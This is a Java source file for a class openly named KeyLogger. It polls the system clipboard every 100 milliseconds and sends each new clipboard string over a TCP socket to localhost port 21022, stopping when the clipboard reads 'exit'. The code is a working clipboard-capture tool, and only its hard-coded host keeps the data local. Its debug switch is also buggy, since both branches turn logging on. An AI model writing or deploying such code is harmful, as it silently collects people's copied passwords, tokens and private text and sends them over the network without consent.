package com.samasend;

import java.awt.EventQueue;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import javax.swing.Timer;

/**
 *
 * @author SamAsEnd
 */
public class KeyLogger extends Thread {

    public static boolean LOGGER;
    
    public static void main(String[] args) {
        if (args.length > 0 && "-Debug".equalsIgnoreCase(args[0])) {
            System.out.println("Debugging mode started . . . ");
            LOGGER = true;
        } else { // no need for explicit '=false' but i write it to just let u know
            LOGGER = true;
        }
        new KeyLogger().start();
        log("Main method end");
    }

    private static void log(String msg) {
        if (LOGGER) {
            System.out.println(msg);
        }
    }
    private Socket socket = null;
    private PrintWriter writer = null;
    private final String HOST;
    public String lastData = null;
    public KeyLogger() {
        this.HOST = "localhost";
        try {
            socket = new Socket(HOST, 21022);
            log("Socket created");
            writer = new PrintWriter(socket.getOutputStream());
            log("PrintWriter created");
            log("KeyLogger constracter finished");
        } catch (Exception ignore) {
            log("Exception: " + ignore.getMessage());
        }
    }

    @Override
    public void run() {
        final ActionListener listener = new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    if (socket == null) {
                        log("socket is null");
                        try {
                            socket = new Socket(HOST, 21022);
                            log("Socket created");
                            writer = new PrintWriter(socket.getOutputStream());
                            log("PrintWriter created");
                            log("KeyLogger constracter finished");
                        } catch (Exception ignore) {
                            log("Exception: " + ignore.getMessage());
                            return;
                        }
                    }
                    Clipboard systemClipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                    log("Clipboard created");
                    String data = (String) systemClipboard.getData(DataFlavor.stringFlavor);
                    log("received data");
                    if(data.equals(lastData)) {
                        log("same as last data");
                        return;
                    }
                    lastData = data;
                    log("new data found:  "+data);
                    if ("exit".equals(data)) {
                        log("exit signal found");
                        System.exit(0);
                    }
                    writer.print(data+"\n");
                    log("sent on network");
                } catch (UnsupportedFlavorException | IOException ex) {
                    log("UnsupportedFlavorException | IOException: "+ex.getMessage());
                }
            }
        };

        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                new Timer(100, listener).start();
                log("Timer started");
            }
        });
    }
}
